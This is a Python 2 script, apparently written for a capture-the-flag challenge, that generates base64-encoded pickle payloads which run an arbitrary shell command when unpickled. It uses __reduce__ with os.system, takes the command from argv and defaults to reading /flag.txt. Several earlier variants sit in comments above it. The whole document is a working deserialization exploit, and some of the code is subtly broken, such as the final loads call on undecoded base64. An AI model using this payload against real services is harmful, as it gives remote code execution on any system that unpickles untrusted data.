# import cPickle
# import os
# import sys
# import base64
#
# DEFAULT_COMMAND = "cat /flag.txt"
#
# COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
#
# class PickleRce(object):
#     def __reduce__(self):
#         return (os.system,(DEFAULT_COMMAND,))
#
# print base64.b64encode(cPickle.dumps(PickleRce()))

# import cPickle
# import subprocess
# import base64
#
# class RunBinSh(object):
#   def __reduce__(self):
#     return (subprocess.Popen, (('/flag.txt',),))
#
# print base64.b64encode(cPickle.dumps(RunBinSh()))

# import cPickle
# import os
# class EvilPickle(object):
#     def __reduce__(self):
#         # return (os.system, ('cat /flag.txt', ))
#         print ''.join(file('example.txt'))
#         return (print, ('cat /flag.txt', ))
# pickle_data = cPickle.dumps(EvilPickle())
# with open("backup.data", "wb") as file:
#     file.write(pickle_data)
#
# with open("backup.data", "rb") as file:
#     pickle_data = file.read()
# my_data = cPickle.loads(pickle_data)

#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import cPickle
import sys
import base64

DEFAULT_COMMAND = "cat /flag.txt"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

string = base64.b64encode(cPickle.dumps(PickleRce()))
print string
print base64.b64decode(cPickle.loads(string))